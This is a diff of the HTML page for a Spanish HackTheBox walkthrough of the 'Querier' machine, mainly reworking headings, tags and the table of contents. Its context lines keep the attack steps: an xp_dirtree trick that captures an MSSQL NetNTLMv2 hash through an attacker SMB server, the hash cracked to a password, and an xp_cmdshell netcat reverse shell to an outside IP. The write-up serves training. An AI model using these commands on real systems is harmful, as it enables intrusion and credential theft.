@@ -1232,7 +1232,7 @@
 <meta name="description" content="Querier es una maquina de HackTheBox, descubrirmos credenciales en una coneccion de base de datos SQL Server dentro de los macros de Excel (xlsm) lo que nos dio acceso a la base de datos mediante un script de Impacket y que posteriormente nos permitio realizar Out-of-Band para obtener las credenciales, este ultimo nos permitio ejecutar una shell inversa. Tras ejecutar PowerUp encontramos credenciales las cuales utilizamos en PSexec para obtener privilegios de administrador." />
 
 
-<meta name="keywords" content="smbclient,binwalk,mssql,impacket,powerup">
+<meta name="keywords" content="smbclient,binwalk,mssql,impacket,powershell,powerup,mssqlclient,out-of-band,SQL Server">
 
 <meta name="created" content="2019-06-22T00:00:00&#43;0000">
 <meta name="modified" content="2019-06-22T00:00:00&#43;0000">
@@ -1285,7 +1285,7 @@
     "dateModified": "2019-06-22T00:00:00Z",
     "url" : "https://sckull.github.io/posts/querier/",
     "description": "Querier es una maquina de HackTheBox, descubrirmos credenciales en una coneccion de base de datos SQL Server dentro de los macros de Excel (xlsm) lo que nos dio acceso a la base de datos mediante un script de Impacket y que posteriormente nos permitio realizar Out-of-Band para obtener las credenciales, este ultimo nos permitio ejecutar una shell inversa. Tras ejecutar PowerUp encontramos credenciales las cuales utilizamos en PSexec para obtener privilegios de administrador.",
-    "keywords": ["smbclient","binwalk","mssql","impacket","powerup"],
+    "keywords": ["smbclient","binwalk","mssql","impacket","powershell","powerup","mssqlclient","out-of-band","SQL Server"],
     "image" : "https://sckull.github.io/images/posts/htb/querier/cover.webp",
     "author": {
       "@type": "Person",
@@ -1603,6 +1603,9 @@
   🏷️
   
 
+  <li><a href="https://sckull.github.io/tags/powershell/" class="single__tag" title="powershell">powershell</a></li>
+  
+
   <li><a href="https://sckull.github.io/tags/impacket/" class="single__tag" title="impacket">impacket</a></li>
   
 
@@ -1616,6 +1619,15 @@
   
 
   <li><a href="https://sckull.github.io/tags/mssql/" class="single__tag" title="mssql">mssql</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/mssqlclient/" class="single__tag" title="mssqlclient">mssqlclient</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/out-of-band/" class="single__tag" title="out-of-band">out-of-band</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/sql-server/" class="single__tag" title="SQL Server">SQL Server</a></li>
   
 
 </ul>
@@ -1699,7 +1711,8 @@
 </tr>
 </tbody>
 </table>
-<h1 id="masscan">MASSCAN</h1>
+<h1 id="recon">Recon</h1>
+<h2 id="masscan">Masscan</h2>
 <p>Utilizando la herramienta masscan para hacer un escaneo rapido de todos los puertos en tcp y udp</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1739,10 +1752,10 @@ Discovered open port 49671/tcp on 10.10.10.125
 Discovered open port 139/tcp on 10.10.10.125 
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="http">HTTP</h1>
+</div><h2 id="http">HTTP</h2>
 <p>Al realizar una busqueda de archivos y directorios en el <code>puerto 5985</code> no encontramos nada.<br />
 <img src="/images/posts/htb/querier/Screenshot_20190220_181124.webp" alt="image" /></p>
-<h1 id="smbclient">SMBCLIENT</h1>
+<h2 id="smbclient">SMBCLIENT</h2>
 <p>Enumerando <code>SHARENAMES</code> con smbclient encontramos <code>Reports</code> e intentamos conectarnos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1848,9 +1861,11 @@ Enter WORKGROUP<span class="se">\r</span>oot<span class="err">&#39;</span>s pass
 <span class="k">End</span> <span class="k">Sub</span>
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="microsoft-sql-server">MICROSOFT SQL SERVER</h1>
+</div><h1 id="microsoft-sql-server">Microsoft SQL Server</h1>
 <p>Ya que tenemos credenciales para la base de datos procedemos a utilizar <code>mssqlclient.py</code> el cual es un script que funciona para conectarnos a una base de datos utilizando autenticacion de windows. Ya dentro encontramos bases de datos que son por &ldquo;default&rdquo; en Microsoft SQL Server.</p>
-<p><a href="https://facility9.com/2009/10/an-introduction-to-sql-server-system-databases/"><strong>SQL Server Database</strong></a></p>
+<ul>
+<li><a href="https://facility9.com/2009/10/an-introduction-to-sql-server-system-databases/"><strong>SQL Server Database</strong></a></li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt"> 1
@@ -1889,7 +1904,7 @@ volume
 <span class="nb">declare</span> @q varchar<span class="o">(</span>99<span class="o">)</span><span class="p">;</span><span class="nb">set</span> @q<span class="o">=</span><span class="s1">&#39;\\10.10.14.23\test&#39;</span><span class="p">;</span><span class="nb">exec</span> master.dbo.xp_dirtree @q HTTP/1.1
 </code></pre></td></tr></table>
 </div>
-</div><h4 id="local">LOCAL</h4>
+</div><h2 id="local">Local</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1898,7 +1913,7 @@ volume
 <pre class="chroma"><code class="language-bash" data-lang="bash">python smbserver.py -smb2support -port <span class="m">445</span> -ip 10.10.12.220 Me /tmp/me
 </code></pre></td></tr></table>
 </div>
-</div><h4 id="remote">REMOTE</h4>
+</div><h2 id="remote">Remote</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1907,9 +1922,11 @@ volume
 <pre class="chroma"><code class="language-bash" data-lang="bash">EXEC MASTER.sys.xp_dirtree <span class="s1">&#39;\\10.10.12.220\Me&#39;</span>, 1, <span class="m">1</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478"><strong>CAPTURE MSSQL CREDENTIALS WITH SMBSERVER</strong></a></p>
-<p><img src="/images/posts/htb/querier/Screenshot_20190220_230209.webp" alt="image" /></p>
-<h4 id="hashcat">Hashcat</h4>
+</div><p><img src="/images/posts/htb/querier/Screenshot_20190220_230209.webp" alt="image" /></p>
+<ul>
+<li><a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478"><strong>Capture MSSQL Credentials - SMBSERVER</strong></a></li>
+</ul>
+<h2 id="hashcat">Hashcat</h2>
 <p>Utilizamos hashcat para desencriptar.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1923,7 +1940,7 @@ volume
 mssql-svc::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000
 </code></pre></td></tr></table>
 </div>
-</div><h4 id="decrypted">DECRYPTED</h4>
+</div><p>Valor del hash.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1932,7 +1949,7 @@ mssql-svc::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:01010000000
 <pre class="chroma"><code class="language-text" data-lang="text">MSSQL-SVC::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000:corporate568
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="user---flag">USER - FLAG</h1>
+</div><h1 id="user---flag">User - Flag</h1>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1965,7 +1982,7 @@ output
 c37b41bb669da345bb14de50faab3c16
 </code></pre></td></tr></table>
 </div>
-</div><h4 id="shell-inversa---netcat">SHELL INVERSA - NETCAT</h4>
+</div><h2 id="shell">Shell</h2>
 <p>Utilizando powershell para descargar <code>nc.exe</code> (netcat) en la computadora.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1984,7 +2001,7 @@ c37b41bb669da345bb14de50faab3c16
 <pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">EXEC</span> <span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">xp_cmdshell</span> <span class="s1">&#39;C:\Users\mssql-svc\Desktop\nc.exe -e cmd 10.10.12.33 7878&#39;</span><span class="p">;</span>
 </code></pre></td></tr></table>
 </div>
-</div><h4 id="local-1">Local</h4>
+</div><h2 id="local-1">Local</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -1993,11 +2010,13 @@ c37b41bb669da345bb14de50faab3c16
 <pre class="chroma"><code class="language-bash" data-lang="bash">nc -lvp <span class="m">7878</span>
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
+</div><h1 id="privesc">Privesc</h1>
 <p>Estando dentro de la maquina como <code>MSSQL-SVC</code> procedemos a hacer una enumeracion con <code>PowerUp</code> el cual es un script escrito en powershell para enumerar los diferentes vectores de ataque para escalar privilegios en windows.</p>
-<h4 id="powerup">PowerUp</h4>
+<h2 id="powerup">PowerUp</h2>
 <p>Descargamos, importamos PowerUp y hacemos una enumeracion de todas las funciones que contiene.</p>
-<p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc"><strong>PowerUp.ps1</strong></a></p>
+<ul>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc"><strong>PowerUp.ps1</strong></a></li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -2262,7 +2281,7 @@ b19c3794f786a1fdcf205f81497c3592
       
     
       
-        <a href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20Querier&url=https%3a%2f%2fsckull.github.io%2fposts%2fquerier%2f&hashtags=smbclient%2cbinwalk%2cmssql%2cimpacket%2cpowerup&via=%40sckull_" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20Querier&url=https%3a%2f%2fsckull.github.io%2fposts%2fquerier%2f&hashtags=smbclient%2cbinwalk%2cmssql%2cimpacket%2cpowershell%2cpowerup%2cmssqlclient%2cout-of-band%2cSQL%20Server&via=%40sckull_" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
         </a>
       
@@ -3580,39 +3599,31 @@ var a = document.getElementsByClassName('navbar__menu-item')
           <nav id="TableOfContents">
   <ul>
     <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
-    <li><a href="#masscan">MASSCAN</a></li>
-    <li><a href="#http">HTTP</a></li>
-    <li><a href="#smbclient">SMBCLIENT</a>
+    <li><a href="#recon">Recon</a>
       <ul>
+        <li><a href="#masscan">Masscan</a></li>
+        <li><a href="#http">HTTP</a></li>
+        <li><a href="#smbclient">SMBCLIENT</a></li>
         <li><a href="#binwalk">Binwalk</a></li>
       </ul>
     </li>
-    <li><a href="#microsoft-sql-server">MICROSOFT SQL SERVER</a></li>
+    <li><a href="#microsoft-sql-server">Microsoft SQL Server</a></li>
     <li><a href="#mssql-oob">MSSQL OOB</a>
       <ul>
-        <li>
-          <ul>
-            <li></li>
-          </ul>
-        </li>
+        <li><a href="#local">Local</a></li>
+        <li><a href="#remote">Remote</a></li>
+        <li><a href="#hashcat">Hashcat</a></li>
       </ul>
     </li>
-    <li><a href="#user---flag">USER - FLAG</a>
+    <li><a href="#user---flag">User - Flag</a>
       <ul>
-        <li>
-          <ul>
-            <li></li>
-          </ul>
-        </li>
+        <li><a href="#shell">Shell</a></li>
+        <li><a href="#local-1">Local</a></li>
       </ul>
     </li>
-    <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a>
+    <li><a href="#privesc">Privesc</a>
       <ul>
-        <li>
-          <ul>
-            <li></li>
-          </ul>
-        </li>
+        <li><a href="#powerup">PowerUp</a></li>
       </ul>
     </li>
   </ul>
